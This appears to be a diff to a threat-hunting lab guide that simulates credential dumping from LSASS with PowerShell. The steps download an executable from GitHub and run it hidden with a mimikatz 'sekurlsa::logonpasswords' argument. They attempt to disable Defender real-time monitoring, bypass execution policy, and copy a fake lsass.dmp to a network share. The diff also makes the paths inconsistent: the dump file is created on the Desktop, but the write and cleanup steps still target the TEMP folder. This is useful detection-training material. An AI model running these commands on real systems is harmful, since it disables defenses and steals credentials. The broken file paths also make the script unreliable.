@@ -90,27 +90,28 @@ DeviceNetworkEvents
 ✅ PowerShell Steps to Simulate the Credential Dump Simulation
 
 ```Powershell
+
 # Simulate download of a known credential dumping tool
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aduragbemioo/Threat-Hunt-Scenario-Credential-Dumping-via-LSASS-Access/refs/heads/main/mimi-sim.exe" -OutFile "$env:USERPROFILE\Downloads\mimi-sim.exe"
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aduragbemioo/Threat-Hunt-Scenario-Credential-Dumping-via-LSASS-Access/refs/heads/main/mimi-sim.exe" -OutFile "$env:USERPROFILE\Downloads\mimi-sim.exe"
 
 # Simulate disabling Windows Defender (for detection/log creation only — doesn't actually succeed if Defender is enabled)
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" | Out-Null
+powershell.exe -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true" | Out-Null
 
 # Simulate credential dumping execution (e.g., mimikatz or procdump against lsass)
-Start-Process -FilePath "$env:USERPROFILE\Downloads\mimi-sim.exe" -ArgumentList '"sekurlsa::logonpasswords"' -WindowStyle Hidden
+powershell.exe -ExecutionPolicy Bypass -Command Start-Process -FilePath "$env:USERPROFILE\Downloads\mimi-sim.exe" -ArgumentList '"sekurlsa::logonpasswords"' -WindowStyle Hidden
 
 # Simulate creation of LSASS dump file
-New-Item -Path "$env:TEMP\lsass.dmp" -ItemType File -Force | Out-Null
-Set-Content -Path "$env:TEMP\lsass.dmp" -Value "This is a simulated memory dump of LSASS."
+New-Item -Path "$env:USERPROFILE\Desktop\lsass.dmp" -ItemType File -Force | Out-Null
+powershell.exe -ExecutionPolicy Bypass -Command Set-Content -Path "$env:TEMP\lsass.dmp" -Value "This is a simulated memory dump of LSASS."
 
 # Simulate file exfiltration by copying to a network share or USB (fake path)
-Copy-Item "$env:TEMP\lsass.dmp" -Destination "\\192.168.1.99\shared\lsass.dmp" -Force
+powershell.exe -ExecutionPolicy Bypass -Command Copy-Item "$env:USERPROFILE\Desktop\lsass.dmp" -Destination "\\192.168.1.99\shared\lsass.dmp" -Force
 
 
 # Clean up simulated artifacts (optional)
 Start-Sleep -Seconds 5
-Remove-Item "$env:TEMP\lsass.dmp" -Force
-Remove-Item "$env:USERPROFILE\Downloads\mimi-sim.exe" -Force
+powershell.exe -ExecutionPolicy Bypass -Command Remove-Item "$env:TEMP\lsass.dmp" -Force
+powershell.exe -ExecutionPolicy Bypass -Command Remove-Item "$env:USERPROFILE\Downloads\mimi-sim.exe" -Force
 
 
 ```
